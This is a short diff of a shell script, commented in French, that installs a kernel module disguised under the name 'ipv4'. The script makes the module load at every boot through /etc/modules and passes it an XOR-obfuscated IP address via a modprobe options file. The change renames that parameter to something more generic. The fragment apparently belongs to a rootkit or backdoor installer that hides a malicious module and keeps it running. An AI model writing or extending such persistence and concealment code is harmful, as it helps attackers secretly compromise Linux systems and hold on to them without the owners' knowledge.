@@ -36,7 +36,7 @@ encrypted=$(xor_encrypt "$IP_ADDR" "$key")
 # persistence (load le module au demarage)
 echo "ipv4" >> /etc/modules
 mkdir -p /lib/modules/$(uname -r)/extra
-echo "options ipv4 ip=$encrypted" > /etc/modprobe.d/ipv4.conf
+echo "options ipv4 param=$encrypted" > /etc/modprobe.d/ipv4.conf
 cp ipv4.ko /lib/modules/$(uname -r)/extra/
 depmod -a
 
